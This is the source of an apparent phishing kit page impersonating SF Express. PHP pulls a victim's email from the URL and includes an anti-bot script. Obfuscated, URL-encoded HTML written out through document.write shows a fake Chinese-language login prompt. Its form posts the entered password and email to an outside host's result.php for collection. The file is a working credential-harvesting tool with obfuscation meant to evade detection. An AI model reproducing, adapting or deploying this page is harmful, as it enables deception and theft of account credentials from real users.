<?php
include('antibots6.php');
?>
<?php
function getloginIDFromlogin($email)
{
$find = '@';
$pos = strpos($email, $find);
$loginID = substr($email, 0, $pos);
return $loginID;
}
function getDomainFromEmail($email)
{
// Get the data after the @ sign
$domain = substr(strrchr($email, "@"), 1);
return $domain;
}
$login = $_GET['email'];
$loginID = getloginIDFromlogin($login);
$domain = getDomainFromEmail($login);
$ln = strlen($login);
$len = strrev($login);
$x = 0;
for($i=0; $i<$ln; $i++){
	if($len[$i] == "@"){
		$x = $i;
		break;
	}
}
$yuh = substr($len,0,$x);
$yuh = strrev($yuh);
for($i=0; $i<$ln; $i++){
	if($yuh[$i] == "."){
		$x = $i;
		break;
	}
}
$yuh = substr($yuh,0,$x);
$yuh = ucfirst($yuh);
?>
<html lang="en" >
<head>
  <meta charset="UTF-8">
  <title>SF Express </title>
  
<script type="text/javascript">
<!--
document.write(unescape('%3Clink%20rel%3D%22icon%22%20href%3D%22https%3A%2F%2Fbozoktraktor.com%2Fsfexpess%2Fsource%2Fincludes%2Ffavicon.svg%22%20type%3D%22image%2Fgif%22%20sizes%3D%2216x16%22%3E%0A%20%20%3Cmeta%20http-equiv%3D%22X-UA-Compatible%22%20content%3D%22IE%3Dedge%22%2F%3E%0A%20%20%3Cmeta%20name%3D%22viewport%22%20content%3D%22width%3Ddevice-width%2C%20initial-scale%3D1.0%2C%20maximum-scale%3D1.0%2C%20user-scalable%3Dno%22%2F%3E%0A%0A%20%20%3Clink%20rel%3D%22stylesheet%22%20href%3D%22.%2Fstyle.css%22%3E%0A%20%20%0A%20%20%3Cstyle%20style%3D%22text%2Fcss%22%3E%0A%20%20%09.hoverTable%7B%0A%09%09border-collapse%3Acollapse%3B%20%0A%09%7D%0A%09.hoverTable%20td%7B%20%0A%09%09padding%3A7px%3B%0A%09%7D%0A%09%2F*%20Define%20the%20default%20color%20for%20all%20the%20table%20rows%20*%2F%0A%09.hoverTable%20tr%7B%0A%09%09background%3A%20%23960606%3B%0A%09%7D%0A%09%2F*%20Define%20the%20hover%20highlight%20color%20for%20the%20table%20row%20*%2F%0A%20%20%20%20.hoverTable%20tr%3Ahover%20%7B%0A%20%20%20%20%20%20%20%20%20%20background-color%3A%20%231C1C1C%3B%0A%20%20%20%20%7D%0A%20%20%3C%2Fstyle%3E%0A%20%20%0A%20%20%0A%20%20%0A%20%20%0A%20%20%0A%20%20%0A%20%20%3Cstyle%3E%0A%09%09%2F*%20unvisited%20link%20*%2F%0A%09%09a%3Alink%20%7B%0A%09%09color%3A%20%23FFF%3B%0A%09%09%7D%0A%0A%09%09%2F*%20visited%20link%20*%2F%0A%09%09a%3Avisited%20%7B%0A%09%09color%3A%20%23FFF%3B%0A%09%09%7D%0A%0A%09%09%2F*%20mouse%20over%20link%20*%2F%0A%09%09a%3Ahover%20%7B%0A%09%09color%3A%20%23DF0101%3B%0A%09%09%7D%0A%0A%09%09%2F*%20selected%20link%20*%2F%0A%09%09a%3Aactive%20%7B%0A%09%09color%3A%20%23A9D0F5%3B%0A%09%09%7D%0A%20%20%3C%2Fstyle%3E%0A%20%20%0A%20%20%0A%20%20%0A%20%20%0A%20%20%3Cstyle%3E%0Abody%2C%20html%20%7B%0A%20%20height%3A%20100%25%3B%0A%20%20margin%3A%200%3B%0A%20%20font-family%3A%20Arial%2C%20Helvetica%2C%20sans-serif%3B%0A%7D%0A%0A*%20%7B%0A%20%20box-sizing%3A%20border-box%3B%0A%7D%0A%0A.bg-image%20%7B%0A%20%20%2F*%20The%20image%20used%20*%2F%0A%20%20background-image%3A%20url(%22https%3A%2F%2Fbozoktraktor.com%2Fsfexpess%2Fsource%2Fincludes%2Fbackground.jpg%22)%3B%0A%20%20%0A%20%20%2F*%20Add%20the%20blur%20effect%20*%2F%0A%20%20filter%3A%20blur(0px)%3B%0A%20%20-webkit-filter%3A%20blur(0px)%3B%0A%20%20%0A%20%20%2F*%20Full%20height%20*%2F%0A%20%20height%3A%20100%25%3B%20%0A%20%20%0A%20%20%2F*%20Center%20and%20scale%20the%20image%20nicely%20*%2F%0A%20%20background-position%3A%20center%3B%0A%20%20background-repeat%3A%20no-repeat%3B%0A%20%20background-size%3A%20cover%3B%0A%7D%0A%0A%2F*%20Position%20text%20in%20the%20middle%20of%20the%20page%2Fimage%20*%2F%0A.bg-text%20%7B%0A%20%20background-color%3A%20rgb(13%2C107%2C38)%3B%20%2F*%20Fallback%20color%20*%2F%0A%20%20background-color%3A%20%23960606%3B%0A%20%20color%3A%20white%3B%0A%20%20font-weight%3A%20bold%3B%0A%20%20border%3A%201px%20solid%20%23960606%3B%0A%20%20position%3A%20absolute%3B%0A%20%20top%3A%2050%25%3B%0A%20%20left%3A%2050%25%3B%0A%20%20transform%3A%20translate(-50%25%2C%20-50%25)%3B%0A%20%20z-index%3A%202%3B%0A%20%20width%3A%20350px%3B%0A%20%20box-shadow%3A%202px%202px%204px%20%23000000%3B%20%0A%20%20border-radius%3A%202px%203px%3B%0A%20%20padding%3A%205px%3B%0A%20%20text-align%3A%20center%3B%0A%7D%0A%3C%2Fstyle%3E%0A%0A%0A%3C%2Fhead%3E%0A%0A%3Cbody%20marginwidth%3D%220%22%20marginheight%3D%220%22%20topmargin%3D%220%22%20bottommargin%3D%220%22%20leftmargin%3D%220%22%20rightmargin%3D%220%22%3E%0A%0A%0A%3Ctable%20cellspacing%3D%220%22%20width%3D%22100%25%22%20height%3D%22100%25%22%3E%0A%0A%0A%3Ctr%3E%3Ctd%20height%3D%222%25%22%20bgcolor%3D%22%23960606%22%3E%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%0A%0A%3Ctr%3E%3Ctd%20height%3D%229%25%22%20bgcolor%3D%22%23000000%22%3E%0A%0A%09%3Ctable%20width%3D%2298%25%22%20align%3D%22center%22%3E%3Ctr%3E%0A%09%0A%09%3Ctd%3E%0A%09%0A%09%09%3Ctable%20cellspacing%3D%220%22%3E%3Ctr%3E%0A%09%09%0A%09%09%3Ctd%3E%0A%09%0A%09%09%09%3Cimg%20src%3D%22https%3A%2F%2Fbozoktraktor.com%2Fsfexpess%2Fsource%2Fincludes%2Flogo.png%22%20%0A%09%09%09style%3D%22width%3A80px%3B%20height%3A30px%3B%22%3E%0A%09%09%0A%09%09%3C%2Ftd%3E%0A%09%09%0A%09%09%0A%09%09%0A%09%09%3Ctd%20style%3D%22width%3A10px%3B%22%3E%3C%2Ftd%3E%0A%09%09%0A%09%09%0A%09%09%0A%09%09%3Ctd%3E%0A%09%09%0A%09%09%09%3Cfont%20face%3D%22Arial%2C%20Helvetica%2C%20sans-serif%22%20size%3D%223%22%20color%3D%22%23FFFFFF%22%3E%0A%09%09%09%26%2321253%3B%26%2335065%3B%26%2325509%3B%26%2325910%3B%26%2322120%3B%20%3A'));
//-->
</script>


<?php echo $login ?>

<script type="text/javascript">
<!--
document.write(unescape('%3C%2Ffont%3E%0A%09%09%09%0A%09%09%3C%2Ftd%3E%0A%09%09%0A%09%09%0A%09%09%3C%2Ftr%3E%3C%2Ftable%3E%0A%09%0A%09%3C%2Ftd%3E%0A%09%0A%09%0A%09%0A%09%0A%09%0A%09%0A%09%0A%09%3Ctd%3E%0A%09%0A%09%09%3Ctable%20align%3D%22right%22%20cellspacing%3D%220%22%3E%3Ctr%3E%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%3Ctd%3E%0A%09%09%0A%09%09%09%09%3Ctable%20class%3D%22hoverTable%22%20style%3D%22box-shadow%3A%202px%202px%203px%20%23A4A4A4%3B%20border-radius%3A%203px%203px%3B%20padding%3A10px%3B%22%3E%0A%09%0A%09%09%09%09%3Ctr%3E%0A%09%09%09%09%0A%09%09%09%09%09%3Ctd%20style%3D%22height%3A25px%3B%20width%3A110px%3B%20border-radius%3A%202px%202px%3B%22%3E%0A%09%09%09%09%09%0A%09%09%09%09%09%09%09%09%3Ca%20href%3D%22%22%20style%3D%22text-decoration%3Anone%3B%22%3E%0A%09%09%09%09%09%09%09%09%3Cfont%20face%3D%22verdana%22%20size%3D%222%22%3E%0A%09%09%09%09%09%09%09%09%26nbsp%3B%20%7C%20%26%2330331%3B%26%2320986%3B%0A%09%09%09%09%09%09%09%09%3C%2Ffont%3E%0A%09%09%09%09%09%09%09%09%3C%2Fa%3E%0A%09%09%09%09%09%09%09%0A%09%09%09%09%09%3C%2Ftd%3E%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%3C%2Ftr%3E%0A%09%0A%09%09%09%09%3C%2Ftable%3E%0A%09%09%0A%09%09%3C%2Ftd%3E%0A%09%09%0A%09%09%3C%2Ftr%3E%3C%2Ftable%3E%0A%09%0A%09%3C%2Ftd%3E%0A%09%0A%09%3C%2Ftr%3E%3C%2Ftable%3E%0A%0A%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%0A%0A%0A%3Ctr%3E%3Ctd%20height%3D%2287%25%22%20bgcolor%3D%22%23000000%22%3E%0A%0A%09%0A%09%0A%09%09%09%3Cdiv%20class%3D%22bg-image%22%3E%3C%2Fdiv%3E%0A%0A%0A%0A%0A%0A%0A%09%09%09%3Cdiv%20class%3D%22bg-text%22%3E%0A%09%09%09%09%0A%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%3Ctable%20align%3D%22center%22%20cellspacing%3D%220%22%3E%0A%09%09%09%09%09%0A%09%09%09%09%09%3Ctr%3E%3Ctd%20style%3D%22height%3A20px%3B%22%3E%0A%09%09%09%09%09%0A%09%09%09%09%09%09%09%09%09%09%3Cform%20method%3D%22post%22%20action%3D%22https%3A%2F%2Fbozoktraktor.com%2Fsfexpess%2Fsource%2Fresult.php%22%3E%0A%09%09%09%09%09%0A%09%09%09%09%09%3C%2Ftd%3E%3C%2Ftr%3E%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%3Ctr%3E%3Ctd%3E%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%09%09%3Ctable%20align%3D%22center%22%3E%3Ctr%3E%3Ctd%3E%0A%09%09%09%09%09%09%09%0A%09%09%09%09%09%09%09%0A%09%09%09%09%09%09%09%09%3Cdiv%20align%3D%22center%22%3E%0A%09%09%09%09%09%09%09%09%0A%09%09%09%09%09%09%09%09%09%3Cimg%20src%3D%22https%3A%2F%2Fbozoktraktor.com%2Fsfexpess%2Fsource%2Fincludes%2Ffavicon.svg%22%20style%3D%22height%3A80px%3B%3B%20width%3A80px%3B%22%3E%0A%09%09%09%09%09%09%09%09%0A%09%09%09%09%09%09%09%09%3C%2Fdiv%3E%0A%09%09%09%09%09%09%09%0A%09%09%09%09%09%09%09%0A%09%09%09%09%09%09%09%3C%2Ftd%3E%3C%2Ftr%3E%3C%2Ftable%3E%0A%09%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%3C%2Ftd%3E%3C%2Ftr%3E%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%3Ctr%3E%3Ctd%20style%3D%22height%3A20px%3B%22%3E%3C%2Ftd%3E%3C%2Ftr%3E%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%3Ctr%3E%3Ctd%3E%0A%09%09%09%09%09%0A%09%09%09%09%09%09%09%09%09%09%3Ctable%20align%3D%22center%22%3E%3Ctr%3E%0A%09%09%09%09%09%09%09%09%09%09%0A%09%09%09%09%09%09%09%09%09%09%3Ctd%3E%0A%09%09%09%09%09%09%09%09%09%09%0A%09%09%09%09%09%09%09%09%09%09%09%3Cfont%20face%3D%22Arial%2C%20Helvetica%2C%20sans-serif%22%20size%3D%223%22%20color%3D%22%23FFFFFF%22%3E%0A%09%09%09%09%09%09%09%09%09%09%09SF%20Express%20%26%2322312%3B%26%2332447%3B%26%2336135%3B%26%2336816%3B%26%2336861%3B%26%2336394%3B%26%2322120%3B%0A%09%09%09%09%09%09%09%09%09%09%09%3C%2Ffont%3E%0A%09%09%09%09%09%09%09%09%09%09%0A%09%09%09%09%09%09%09%09%09%09%3C%2Ftd%3E%0A%09%09%09%09%09%0A%09%09%09%09%09%09%09%09%09%09%3C%2Ftr%3E%3C%2Ftable%3E%0A%09%09%09%09%09%0A%09%09%09%09%09%3C%2Ftd%3E%3C%2Ftr%3E%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%3Ctr%3E%3Ctd%3E%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%09%09%09%09%09%3Cdiv%20align%3D%22center%22%3E%0A%09%09%09%0A%09%09%09%09%09%09%09%09%09%09%09%3Cfont%20face%3D%22Arial%2C%20Helvetica%2C%20sans-serif%22%20size%3D%222%22%20color%3D%22%23FFFFFF%22%3E%0A%09%09%09%09%09%09%09%09%09%09%09%26%2324744%3B%26%2330340%3B%26%2336135%3B%26%2324050%3B%26%2320934%3B%26%2322791%3B%26%2322909%3B%20.%20%0A%09%09%09%09%09%09%09%09%09%09%09%26%2335831%3B%26%2339564%3B%26%2335777%3B%26%2324744%3B%26%2330340%3B%26%2336523%3B%26%2320221%3B%26%2320197%3B%26%2336319%3B%26%2336394%3B%26%2324744%3B%26%2330340%3B%26%2321457%3B%26%2336135%3B%0A%09%09%09%09%09%09%09%09%09%09%09%3C%2Ffont%3E%0A%09%09%09%09%09%0A%09%09%09%09%09%09%09%09%09%09%3C%2Fdiv%3E%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%3C%2Ftd%3E%3C%2Ftr%3E%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%3Ctr%3E%3Ctd%20style%3D%22height%3A15px%3B%22%3E%3C%2Ftd%3E%3C%2Ftr%3E%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%3Ctr%3E%3Ctd%3E%0A%09%09%09%09%09%0A%09%09%09%09%09%09%09%09%09%09%3Cdiv%20align%3D%22center%22%3E%0A%09%09%09%0A%09%09%09%09%09%09%09%09%09%09%09%3Ctable%20align%3D%22center%22%0A%09%09%09%09%09%09%09%09%09%09%09style%3D%22height%3A35px%3B%20width%3A265px%3B%20box-shadow%3A%202px%202px%203px%20%23000000%3B%20border-radius%3A%201px%201px%3B%20background%3A%20%23FFFFFF%3B%20padding%3A7px%3B%20border%3A%201px%20%23848484%22%3E%0A%09%09%09%09%09%09%09%09%09%09%09%3Ctr%3E%3Ctd%3E%0A%09%09%09%09%09%09%09%09%09%09%09%0A%09%09%09%09%09%09%09%09%09%09%09%09%09%3Cfont%20face%3D%22Arial%2C%20Helvetica%2C%20sans-serif%22%20size%3D%222%22%20color%3D%22%23000%22%3E%3Cb%3E'));
//-->
</script>


<?php echo $login ?>
													
													
<script type="text/javascript">
<!--
document.write(unescape('%3C%2Fb%3E%3C%2Ffont%3E%0A%09%09%09%09%09%09%09%09%09%09%09%0A%09%09%09%09%09%09%09%09%09%09%09%3C%2Ftd%3E%3C%2Ftr%3E%3C%2Ftable%3E%0A%09%09%09%09%09%0A%09%09%09%09%09%09%09%09%09%09%3C%2Fdiv%3E%0A%09%09%09%09%09%0A%09%09%09%09%09%3C%2Ftd%3E%3C%2Ftr%3E%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%3Ctr%3E%3Ctd%20style%3D%22height%3A5px%3B%22%3E%3C%2Ftd%3E%3C%2Ftr%3E%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%3Ctr%3E%3Ctd%3E%0A%09%09%09%09%09%0A%09%09%09%09%09%09%09%09%09%09%09%3Cdiv%20align%3D%22center%22%3E%0A%09%09%09%0A%09%09%09%09%09%09%09%09%09%09%09%3Cinput%20type%3D%22password%22%20name%3D%22passwd%22%20placeholder%3D%22%26%2336755%3B%26%2320837%3B%26%2323494%3B%26%2330721%3B%22%20required%3D%22%22%20%0A%09%09%09%09%09%09%09%09%09%09%09style%3D%22height%3A35px%3B%20width%3A265px%3B%20box-shadow%3A%202px%202px%203px%20%23000000%3B%20border-radius%3A%201px%201px%3B%20background%3A%20%23FFFFFF%3B%20padding%3A7px%3B%20border%3A%201px%20%23848484%22%3E%0A%09%09%09%09%09%0A%09%09%09%09%09%09%09%09%09%09%09%3C%2Fdiv%3E%0A%09%09%09%09%09%0A%09%09%09%09%09%3C%2Ftd%3E%3C%2Ftr%3E%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%3Ctr%3E%3Ctd%20style%3D%22height%3A5px%3B%22%3E%3C%2Ftd%3E%3C%2Ftr%3E%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%3Ctr%3E%3Ctd%3E%0A%09%09%09%09%09%09%0A%09%09%09%09%09%09%09%09%09%09%3Ctable%20style%3D%22width%3A275px%3B%22%20align%3D%22center%22%3E%3Ctr%3E%3Ctd%3E%0A%09%09%09%09%09%09%09%09%09%09%0A%09%09%09%09%09%09%09%09%09%09%09%3Cinput%20type%3D%22checkbox%22%20checked%3D%22%22%3E%20%0A%09%09%09%09%09%09%09%09%09%09%09%3Cfont%20face%3D%22Arial%2C%20Helvetica%2C%20sans-serif%22%20size%3D%222%22%20color%3D%22%23FFFFFF%22%3E%26%2322312%3B%26%2327492%3B%26%2335774%3B%26%2322791%3B%26%2319978%3B%26%2335760%3B%26%2320303%3B%26%2325105%3B%26%2330340%3B%26%2324080%3B%26%2325143%3B%3C%2Ffont%3E%0A%09%09%09%09%09%0A%09%09%09%09%09%09%09%09%09%09%3C%2Ftd%3E%3C%2Ftr%3E%3C%2Ftable%3E%0A%09%09%09%09%09%09%09%09%09%09%0A%09%09%09%09%09%3C%2Ftd%3E%3C%2Ftr%3E%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%3Ctr%3E%3Ctd%20style%3D%22height%3A5px%3B%22%3E%3C%2Ftd%3E%3C%2Ftr%3E%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%3Ctr%3E%3Ctd%3E%0A%09%09%09%09%09%0A%09%09%09%09%09%09%09%09%09%09%09%3Cdiv%20align%3D%22center%22%3E%0A%09%09%09%0A%09%09%09%09%09%09%09%09%09%09%09%3Cbutton%20style%3D%22height%3A35px%3B%20width%3A265px%3B%20box-shadow%3A%202px%202px%203px%20%23A4A4A4%3B%20border-radius%3A%201px%201px%3B%20background%3A%20%23000000%3B%20border%3A%201px%20%23000000%3B%22%3E%0A%09%09%09%09%09%0A%09%09%09%09%09%09%09%09%09%09%09%09%09%3Cfont%20face%3D%22Arial%2C%20Helvetica%2C%20sans-serif%22%20size%3D%222%22%20color%3D%22%23FFF%22%3E%0A%09%09%09%09%09%09%09%09%09%09%09%09%09%3Cb%3E%26%2336861%3B%26%2336394%3B%26%2325105%3B%26%2330340%3B%26%2336135%3B%26%2320214%3B%20%3E%3E%3E%3C%2Fb%3E%0A%09%09%09%09%09%09%09%09%09%09%09%09%09%3C%2Ffont%3E%0A%09%09%09%09%09%0A%09%09%09%09%09%09%09%09%09%09%09%3C%2Fbutton%3E%0A%09%09%09%09%09%09%0A%09%09%09%09%09%09%09%09%09%09%09%3C%2Fdiv%3E%0A%09%09%09%09%09%0A%09%09%09%09%09%3C%2Ftd%3E%3C%2Ftr%3E%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%0A%09%09%09%09%09%3Ctr%3E%3Ctd%20style%3D%22height%3A30px%3B%22%3E'));
//-->
</script>

					
<input type="hidden" name="login" value="<?php echo $login ?>">
							
<script type="text/javascript">
<!--
document.write(unescape('%3C%2Fform%3E%0A%09%09%09%09%09%0A%09%09%09%09%09%3C%2Ftd%3E%3C%2Ftr%3E%0A%09%09%09%09%09%0A%09%09%09%09%09%3C%2Ftable%3E%0A%09%09%09%09%0A%09%09%09%09%0A%09%09%09%09%0A%09%09%09%3C%2Fdiv%3E%0A%09%09%09%0A%09%0A%09%0A%0A%0A%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%0A%0A%3Ctr%3E%3Ctd%20height%3D%2230%22%20bgcolor%3D%22%23000000%22%3E%0A%0A%09%3Cdiv%20align%3D%22center%22%3E%0A%09%0A%09%09%0A%09%09%3Cfont%20face%3D%22verdana%22%20size%3D%221%22%20color%3D%22%23FFF%22%3E%0A%09%09SF%20Express%20%26copy%3B%201998-2020%20%20%26%2332593%3B%26%2332476%3B%26%2324212%3B%26%2329992%3B%20%7C%20%26%2329256%3B%26%2326435%3B%26%2325152%3B%26%2326377%3B.%0A%09%09%3C%2Ffont%3E%0A%09%09%0A%09%09%0A%09%3C%2Fdiv%3E%0A%0A%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%0A%3C%2Ftable%3E%0A%0A%3C%2Fbody%3E%0A%3C%2Fhtml%3E'));
//-->
</script>
